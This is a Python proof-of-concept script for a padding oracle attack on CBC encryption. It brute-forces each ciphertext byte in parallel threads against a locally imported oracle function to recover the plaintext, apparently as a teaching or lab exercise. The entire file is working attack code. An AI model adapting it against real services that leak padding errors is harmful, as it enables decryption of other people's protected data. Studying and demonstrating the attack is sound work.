#!/usr/bin/env python3
import concurrent.futures
import threading
from settings import *
from oracle import *

##########################################
# Padding Oracle Attack Proof of Concept #
##########################################

max_concurrent_threads = 10
stop_event = threading.Event()

def poc(encrypted):
    block_number = len(encrypted)//BYTE_NB
    decrypted = bytes()
    # Go through each block
    for i in range(block_number, 0, -1):
        current_encrypted_block = encrypted[(i-1)*BYTE_NB:(i)*BYTE_NB]

        # At the first encrypted block, use the initialization vector if it is known
        if(i == 1):
            previous_encrypted_block = bytearray(IV.encode("ascii"))
        else:
            previous_encrypted_block = encrypted[(i-2)*BYTE_NB:(i-1)*BYTE_NB]
 
        bruteforce_block = previous_encrypted_block
        current_decrypted_block = bytearray(IV.encode("ascii"))
        padding = 0

        # Go through each byte of the block
        for j in range(BYTE_NB, 0, -1):
            padding += 1

            # Bruteforce byte value
            stop_event.clear()
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_concurrent_threads) as executor:
                futures = {executor.submit(brutforce_byte, bruteforce_block, current_encrypted_block, j, i): i for i in range(1, 257)}

                for future in concurrent.futures.as_completed(futures):
                    r = future.result()
                    if r:
                        bruteforce_block = bytearray(bruteforce_block)
                        bruteforce_block[j-1] = (bruteforce_block[j-1] + r) % 256
                        current_decrypted_block[-padding] = bruteforce_block[-padding] ^ previous_encrypted_block[-padding] ^ padding

                        # Prepare newly found byte values
                        for k in range(1, padding+1):
                            bruteforce_block[-k] = padding+1 ^ current_decrypted_block[-k] ^ previous_encrypted_block[-k]

                        break

            print(current_decrypted_block)

        decrypted = bytes(current_decrypted_block) + bytes(decrypted)

    return decrypted[:-decrypted[-1]]  # Padding removal

def brutforce_byte(bruteforce_block, current_encrypted_block, j, value):
    if stop_event.is_set():
        return 0
    
    bruteforce_block_temp = bytearray(bruteforce_block)
    bruteforce_block_temp[j-1] = (bruteforce_block[j-1] + value) % 256
    joined_encrypted_block = bytes(bruteforce_block_temp) + current_encrypted_block
    if oracle(joined_encrypted_block):
        stop_event.set()
        return value
    else:
        return 0

#### Script ####

usage = """
Usage:
  python3 poracle_exploit.py <message>         decrypts and displays the message
  python3 poracle_exploit.py -o <hex code>     displays oracle answer

Cryptographic parameters can be changed in settings.py
"""

if __name__ == '__main__':
    if len(sys.argv) == 2 : #chiffrement
        if len(sys.argv[1])%16!=0:       # code size security
            print(usage)
        else:
            print("Decrypted message: ", poc(bytes.fromhex(sys.argv[1])).decode("ascii"))
    elif len(sys.argv) == 3 and sys.argv[1] == '-o' : #oracle
        print(oracle(bytes.fromhex(sys.argv[2])))
    else:
        print(usage)
